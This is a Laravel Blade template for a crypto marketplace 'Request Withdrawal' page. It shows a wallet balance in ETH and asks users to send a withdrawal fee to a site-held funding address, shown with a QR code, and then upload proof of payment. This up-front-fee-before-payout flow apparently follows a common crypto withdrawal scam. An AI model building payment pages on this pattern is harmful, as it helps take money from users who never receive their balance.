@section('title', 'Request Withdrawal')
<x-home-layout>
    @vite('resources/css/app.css')

    <div class="no-bottom no-top" id="content">
        <div id="top"></div>

        <section id="subheader" class="text-light"
            data-bgimage="url(/template/assets/images/background/subheader.jpg) top">
            <div class="relative text-center center-y">
                <div class="container">
                    <div class="row">
                        <div class="text-center col-md-12">
                            <h1 class="text-[2.5rem] md:text-[4rem] font-bold">Request Withdrawal</h1>
                        </div>
                        <div class="clearfix"></div>
                    </div>
                </div>
            </div>
        </section>

        <section aria-label="section" class="py-12">
            <div class="container px-4 mx-auto">
                <div class="max-w-3xl mx-auto mb-8 text-center">
                    <h3 class="text-3xl font-bold text-indigo-600">Withdrawal request</h3>
                    <p class="mt-3 text-gray-600">
                        Your wallet is connected and your payout destination is saved. Review the details below before
                        submitting your request.
                    </p>
                </div>

                <div class="grid max-w-5xl gap-4 mx-auto mb-6 md:grid-cols-3">
                    <div class="p-4 bg-white rounded-lg shadow-md">
                        <p class="text-sm font-semibold text-gray-500">Connected wallet</p>
                        <p class="mt-2 font-semibold text-gray-900">{{ $wallet->wallet_provider }}</p>
                        <p class="mt-1 text-sm break-all text-gray-600">{{ $wallet->wallet_address }}</p>
                    </div>

                    <div class="p-4 bg-white rounded-lg shadow-md">
                        <p class="text-sm font-semibold text-gray-500">Withdrawal destination</p>
                        <p class="mt-2 text-sm break-all text-gray-900">{{ $wallet->withdrawal_wallet_address }}</p>
                        <a href="{{ route('withdrawal.wallet') }}" class="inline-block mt-2 text-sm font-semibold text-indigo-600">
                            Update address
                        </a>
                    </div>

                    <div class="p-4 bg-white rounded-lg shadow-md">
                        <p class="text-sm font-semibold text-gray-500">Available balance</p>
                        <p class="mt-2 text-2xl font-bold text-indigo-600">{{ number_format((float) $wallet->balance, 2) }} ETH</p>
                    </div>
                </div>

                <div class="max-w-4xl p-4 mx-auto mb-4 text-center bg-gray-100 rounded-lg">
                    <p class="font-semibold text-gray-700">Make your withdrawal fee payment to the following wallet address:</p>
                    <input type="text" value="{{ config('marketplace.funding_wallet_address') }}" readonly
                        class="w-full p-3 mt-2 font-semibold text-center text-indigo-600 bg-indigo-100 border border-indigo-300 rounded-lg">
                </div>

                <div class="flex justify-center mb-4">
                    <img src="{{ config('marketplace.funding_wallet_qr') }}" alt="QR Code"
                        class="object-cover w-40 h-40 rounded-lg shadow-md">
                </div>

                <div class="max-w-xl p-6 mx-auto bg-white rounded-lg shadow-md">
                    <div class="p-4 mb-6 border border-green-200 rounded-lg bg-green-50">
                        <p class="font-semibold text-green-700">Payout wallet on this request</p>
                        <p class="mt-2 text-sm break-all text-green-700">{{ $wallet->withdrawal_wallet_address }}</p>
                    </div>

                    <form action="{{ route('withdraw') }}" method="POST" class="space-y-4" enctype="multipart/form-data">
                        @csrf

                        <div>
                            <label for="amount" class="block font-semibold text-gray-700">Amount to withdraw</label>
                            <hr class="border-gray-300">
                            <input type="number" step="0.01" id="amount" name="amount" value="{{ old('amount') }}"
                                class="w-full p-3 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-indigo-600">
                            @error('amount')
                                <p class="my-2 text-danger">{{ $message }}</p>
                            @enderror
                        </div>

                        <div>
                            <label for="proof_of_payment" class="block font-semibold text-gray-700">Proof of payment</label>
                            <hr class="border-gray-300">
                            <input type="file" name="proof_of_payment" id="proof_of_payment" accept="image/*"
                                class="w-full p-3 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-indigo-600">
                            @error('proof_of_payment')
                                <p class="my-2 text-danger">{{ $message }}</p>
                            @enderror
                        </div>

                        <input type="submit" value="Submit Withdrawal Request"
                            class="w-full py-3 font-semibold text-white transition bg-indigo-600 rounded-lg cursor-pointer hover:bg-indigo-700">
                    </form>
                </div>
            </div>
        </section>
    </div>
</x-home-layout>
